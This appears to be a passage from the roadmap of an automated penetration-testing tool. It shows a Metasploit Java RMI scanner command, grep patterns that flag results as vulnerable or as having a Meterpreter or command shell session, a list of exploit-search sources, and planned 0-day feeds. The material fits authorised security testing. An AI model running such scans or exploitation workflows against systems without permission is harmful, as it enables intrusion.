        - `msfconsole -q -x "use auxiliary/scanner/misc/java_rmi_server; setg RHOSTS \"$TARGET\"; set RPORT 49180; run; back; exit;"`
    - Vulnerable grep code:
        ```sh
        VULNERABLE_METASPLOIT=$(egrep -h -i -s "may be vulnerable|is vulnerable|IKE response with leak|File saved in")
        VULNERABLE_SHELLSHOCK=$(egrep -h -i -s "The following URLs appear to be exploitable:")
        SHELLED=$(egrep -h -i -s "Meterpreter session|Command executed|File(s) found:|Command Stager progress|File uploaded|Command shell session")
        ```

- Generate wordlists based on website content [TODO]

- Exploit search sources RSS feeds [TODO]
    - CVE Mitre
    - NIST
    - Exploit-DB
    - AttackerKB
    - Rapid7
    - Google
    - SecurityFocus
    - 0day.today
    - Security-Database
    - PacketStorm
    - Shodan
    - Vulners
    - Sploitus
    - Github
    - YouTube
    - Twitter
    - FullDisclosure
    - Certstation

- RSS feeds updates for 0-days exploits [FUTURE]

- AI integration [FUTURE]

- Feed nmap XML into metasploit [NOPE]:
    - `msfconsole -x "workspace -a $WORKSPACE; workspace $WORKSPACE; db_import $LOOT_DIR/nmap/nmap*.xml; hosts; services; exit;" | tee $LOOT_DIR/notes/msf-$WORKSPACE.txt`